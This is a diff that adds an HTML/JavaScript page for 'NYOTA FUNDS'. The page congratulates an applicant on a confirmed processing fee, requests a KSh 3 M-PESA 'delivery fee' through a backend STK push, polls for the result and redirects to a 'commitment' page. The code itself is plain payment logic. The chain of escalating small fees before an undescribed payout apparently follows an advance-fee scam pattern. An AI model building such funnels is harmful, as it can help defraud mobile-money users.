@@ -1,1 +1,891 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>NYOTA FUNDS - Delivery</title>
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    padding:16px 10px;
+    font-family:Arial,sans-serif;
+    background:#006400;
+    color:#FFFFFF;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    margin:0 auto;
+}
+
+.card{
+    width:100%;
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,0.09),
+            rgba(255,255,255,0.035)
+        );
+
+    padding:22px 18px 20px;
+    border-radius:18px;
+
+    box-shadow:
+        0 20px 60px rgba(0,0,0,0.45),
+        inset 0 1px 0 rgba(255,255,255,0.05);
+
+    border:1px solid #000000;
+}
+
+.success{
+    width:70px;
+    height:70px;
+    margin:0 auto 14px;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    background:#FFD400;
+    color:#000000;
+
+    border:2px solid #000000;
+    border-radius:50%;
+
+    font-size:38px;
+    font-weight:800;
+}
+
+h1{
+    text-align:center;
+    background:#000000;
+    color:#FFFFFF;
+
+    font-size:26px;
+    font-weight:800;
+
+    margin:2px 0 16px;
+    padding:10px;
+
+    border:1px solid #FFFFFF;
+    border-radius:10px;
+}
+
+p{
+    text-align:center;
+    font-size:14px;
+    line-height:1.6;
+    color:#FFFFFF;
+}
+
+.name{
+    color:#FFD400;
+    font-weight:800;
+}
+
+.amount{
+    background:#000000;
+    border:1px solid #FFFFFF;
+    border-radius:12px;
+
+    padding:16px 10px;
+    margin:18px 0;
+
+    text-align:center;
+
+    color:#FFD400;
+
+    font-size:28px;
+    font-weight:800;
+}
+
+.info{
+    margin-top:18px;
+
+    background:#000000;
+
+    border:1px solid #FFFFFF;
+    border-radius:12px;
+
+    padding:14px;
+}
+
+.row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+
+    gap:10px;
+    padding:10px 0;
+
+    border-bottom:1px solid
+        rgba(255,255,255,0.25);
+}
+
+.row:last-child{
+    border-bottom:none;
+}
+
+.label{
+    font-size:13px;
+    color:#FFFFFF;
+}
+
+.value{
+    font-size:14px;
+    font-weight:800;
+    color:#FFD400;
+    text-align:right;
+    word-break:break-word;
+}
+
+.notice{
+    margin-top:18px;
+
+    padding:13px;
+
+    background:rgba(255,212,0,0.12);
+
+    border:1px solid #FFD400;
+    border-radius:10px;
+
+    color:#FFFFFF;
+
+    font-size:13px;
+    line-height:1.5;
+
+    text-align:center;
+}
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:18px;
+
+    background:#FFD400;
+    color:#000000;
+
+    border:1px solid #000000;
+    border-radius:11px;
+
+    font-size:16px;
+    font-weight:800;
+
+    cursor:pointer;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.30);
+}
+
+button:active{
+    transform:scale(.98);
+}
+
+button:disabled{
+    background:rgba(255,255,255,0.25);
+    color:#FFFFFF;
+
+    cursor:not-allowed;
+    box-shadow:none;
+}
+
+#message{
+    min-height:22px;
+    margin-top:13px;
+
+    color:#FFD400;
+
+    font-size:13px;
+    font-weight:600;
+
+    line-height:1.5;
+    text-align:center;
+}
+
+.footer{
+    margin-top:15px;
+    text-align:center;
+
+    font-size:12px;
+    color:#FFFFFF;
+}
+
+@media(max-width:360px){
+
+    body{
+        padding:10px 7px;
+    }
+
+    .card{
+        padding:18px 13px 15px;
+        border-radius:15px;
+    }
+
+    h1{
+        font-size:23px;
+    }
+
+    button{
+        padding:14px;
+        font-size:15px;
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<div class="success">
+    ✓
+</div>
+
+<h1>
+    Congratulations 🎊🎊
+</h1>
+
+<p>
+    Welcome,
+    <span class="name" id="name">
+        Applicant
+    </span>
+</p>
+
+<p>
+    Your processing fee payment has been
+    successfully confirmed.
+</p>
+
+<div class="amount">
+    Delivery Fee: KSh 3
+</div>
+
+<p>
+    To continue, please review the delivery fee
+    and tap the button below.
+</p>
+
+<div class="info">
+
+    <div class="row">
+
+        <div class="label">
+            M-PESA Number
+        </div>
+
+        <div class="value" id="phone">
+            —
+        </div>
+
+    </div>
+
+    <div class="row">
+
+        <div class="label">
+            Delivery Fee
+        </div>
+
+        <div class="value">
+            KSh 3
+        </div>
+
+    </div>
+
+</div>
+
+<div class="notice">
+
+    A separate M-PESA STK prompt will be sent
+    for the KSh 3 delivery fee after you tap
+    the payment button.
+
+</div>
+
+<button
+    type="button"
+    id="payBtn"
+    onclick="payDelivery()"
+>
+    Pay KSh 3 Delivery Fee
+</button>
+
+<p id="message"></p>
+
+<div class="footer">
+    NYOTA FUNDS
+</div>
+
+</div>
+
+</div>
+
+
+<script>
+
+/* =====================================================
+   NYOTA BACKEND
+===================================================== */
+
+const BACKEND_URL =
+    "https://nyota-254-backed-1.onrender.com";
+
+const DELIVERY_FEE = 3;
+
+
+/* =====================================================
+   APPLICANT
+===================================================== */
+
+const applicant =
+    localStorage.getItem("applicantName") ||
+    localStorage.getItem("fullName") ||
+    "Applicant";
+
+document.getElementById(
+    "name"
+).textContent = applicant;
+
+
+/* =====================================================
+   PREVIOUS PAYMENT PROTECTION
+===================================================== */
+
+const paymentStatus =
+    localStorage.getItem("paymentStatus") || "";
+
+if(paymentStatus !== "COMPLETED"){
+
+    document.querySelector(".card").innerHTML = `
+
+        <div class="success">!</div>
+
+        <h1>
+            Payment Verification
+        </h1>
+
+        <p>
+            Your previous payment has not been
+            confirmed yet.
+        </p>
+
+        <button
+            type="button"
+            onclick="window.location.href='payment.html'"
+        >
+            Return to Payment
+        </button>
+
+    `;
+
+}
+
+
+/* =====================================================
+   SAVED PHONE
+===================================================== */
+
+const savedPhone =
+    localStorage.getItem("phoneNumber") || "";
+
+document.getElementById(
+    "phone"
+).textContent =
+    savedPhone || "Not available";
+
+
+/* =====================================================
+   NORMALIZE PHONE
+===================================================== */
+
+function normalizePhone(phone){
+
+    let value =
+        String(phone || "")
+            .trim()
+            .replace(/\s+/g,"")
+            .replace(/-/g,"");
+
+    if(value.startsWith("+254")){
+        value = value.substring(1);
+    }
+
+    if(value.startsWith("07")){
+        value =
+            "254" +
+            value.substring(1);
+    }
+
+    if(value.startsWith("01")){
+        value =
+            "254" +
+            value.substring(1);
+    }
+
+    return value;
+
+}
+
+
+/* =====================================================
+   PAY DELIVERY
+===================================================== */
+
+async function payDelivery(){
+
+    const btn =
+        document.getElementById("payBtn");
+
+    const message =
+        document.getElementById("message");
+
+    const phone =
+        normalizePhone(savedPhone);
+
+
+    if(!/^254\d{9}$/.test(phone)){
+
+        message.textContent =
+            "A valid M-PESA number is required.";
+
+        return;
+
+    }
+
+
+    btn.disabled = true;
+
+    btn.textContent =
+        "Sending STK Push...";
+
+    message.textContent =
+        "Please wait...";
+
+
+    try{
+
+        const response =
+            await fetch(
+                BACKEND_URL +
+                "/api/payment/stk-push",
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:
+                            phone,
+
+                        amount:
+                            DELIVERY_FEE,
+
+                        description:
+                            "Nyota delivery fee"
+
+                    })
+                }
+            );
+
+
+        const data =
+            await response
+                .json()
+                .catch(
+                    () => ({})
+                );
+
+
+        console.log(
+            "DELIVERY STK RESPONSE:",
+            data
+        );
+
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+                data.error ||
+                data.message ||
+                "Delivery payment request failed."
+            );
+
+        }
+
+
+        const reference =
+            data.reference;
+
+
+        if(!reference){
+
+            throw new Error(
+                "No payment reference was returned."
+            );
+
+        }
+
+
+        localStorage.setItem(
+            "deliveryPaymentReference",
+            reference
+        );
+
+
+        localStorage.setItem(
+            "deliveryPaymentStatus",
+            "SENT"
+        );
+
+
+        if(data.transactionId){
+
+            localStorage.setItem(
+                "deliveryTransactionId",
+                data.transactionId
+            );
+
+        }
+
+
+        btn.textContent =
+            "Waiting for Payment...";
+
+
+        message.textContent =
+            "M-PESA prompt sent. Enter your M-PESA PIN to complete the KSh 3 delivery fee.";
+
+
+        checkDeliveryPayment(reference);
+
+
+    }catch(error){
+
+        console.error(
+            "DELIVERY PAYMENT ERROR:",
+            error
+        );
+
+
+        message.textContent =
+            error.message ||
+            "Unable to send delivery payment request.";
+
+
+        btn.textContent =
+            "Pay KSh 3 Delivery Fee";
+
+
+        btn.disabled =
+            false;
+
+    }
+
+}
+
+
+/* =====================================================
+   CHECK DELIVERY PAYMENT
+===================================================== */
+
+function checkDeliveryPayment(reference){
+
+    const btn =
+        document.getElementById("payBtn");
+
+    const message =
+        document.getElementById("message");
+
+    let attempts = 0;
+
+    const maxAttempts = 100;
+
+
+    if(window.deliveryChecker){
+
+        clearInterval(
+            window.deliveryChecker
+        );
+
+    }
+
+
+    window.deliveryChecker =
+        setInterval(
+            async function(){
+
+                attempts++;
+
+
+                try{
+
+                    const url =
+                        BACKEND_URL +
+                        "/api/payment/status?reference=" +
+                        encodeURIComponent(
+                            reference
+                        );
+
+
+                    const response =
+                        await fetch(
+                            url,
+                            {
+                                method:"GET",
+                                cache:"no-store"
+                            }
+                        );
+
+
+                    const data =
+                        await response
+                            .json()
+                            .catch(
+                                () => ({})
+                            );
+
+
+                    console.log(
+                        "DELIVERY PAYMENT STATUS:",
+                        data
+                    );
+
+
+                    /* ---------------------------------
+                       SUCCESS
+                    --------------------------------- */
+
+                    if(
+                        data.status === "COMPLETED" ||
+                        data.status === "SUCCESS"
+                    ){
+
+                        clearInterval(
+                            window.deliveryChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "deliveryPaymentStatus",
+                            "COMPLETED"
+                        );
+
+
+                        localStorage.setItem(
+                            "deliveryPaymentReference",
+                            data.reference ||
+                            reference
+                        );
+
+
+                        if(data.transactionId){
+
+                            localStorage.setItem(
+                                "deliveryTransactionId",
+                                data.transactionId
+                            );
+
+                        }
+
+
+                        if(data.mpesaReceipt){
+
+                            localStorage.setItem(
+                                "deliveryMpesaReceipt",
+                                data.mpesaReceipt
+                            );
+
+                        }
+
+
+                        btn.textContent =
+                            "Payment Successful";
+
+
+                        message.textContent =
+                            "Delivery payment successful. Redirecting...";
+
+
+                        /* =================================
+                           GO TO COMMITMENT PAGE
+                        ================================= */
+
+                        window.location.replace(
+                            "commitment.html"
+                        );
+
+                        return;
+
+                    }
+
+
+                    /* ---------------------------------
+                       FAILED
+                    --------------------------------- */
+
+                    if(
+                        data.status === "FAILED"
+                    ){
+
+                        clearInterval(
+                            window.deliveryChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "deliveryPaymentStatus",
+                            "FAILED"
+                        );
+
+
+                        message.textContent =
+                            "The KSh 3 delivery payment was not completed. You can try again.";
+
+
+                        btn.textContent =
+                            "Try KSh 3 Delivery Payment Again";
+
+
+                        btn.disabled =
+                            false;
+
+
+                        return;
+
+                    }
+
+
+                    /* ---------------------------------
+                       EXPIRED
+                    --------------------------------- */
+
+                    if(
+                        data.status === "EXPIRED"
+                    ){
+
+                        clearInterval(
+                            window.deliveryChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "deliveryPaymentStatus",
+                            "EXPIRED"
+                        );
+
+
+                        message.textContent =
+                            "The delivery payment request expired. Please try again.";
+
+
+                        btn.textContent =
+                            "Pay KSh 3 Delivery Fee";
+
+
+                        btn.disabled =
+                            false;
+
+
+                        return;
+
+                    }
+
+
+                    /* ---------------------------------
+                       TIMEOUT
+                    --------------------------------- */
+
+                    if(
+                        attempts >= maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.deliveryChecker
+                        );
+
+
+                        message.textContent =
+                            "Payment confirmation is taking longer than expected. Please try again.";
+
+
+                        btn.textContent =
+                            "Pay KSh 3 Delivery Fee";
+
+
+                        btn.disabled =
+                            false;
+
+                    }
+
+
+                }catch(error){
+
+                    console.error(
+                        "DELIVERY STATUS ERROR:",
+                        error
+                    );
+
+
+                    /*
+                       Temporary Paylor errors such as
+                       HTTP 500 are not immediately treated
+                       as payment failures.
+                    */
+
+                    if(
+                        attempts >= maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.deliveryChecker
+                        );
+
+
+                        message.textContent =
+                            "Unable to confirm the delivery payment right now. Please try again.";
+
+
+                        btn.textContent =
+                            "Pay KSh 3 Delivery Fee";
+
+
+                        btn.disabled =
+                            false;
+
+                    }
+
+                }
+
+            },
+            3000
+        );
+
+}
+
+</script>
+
+</body>
+
+</html>
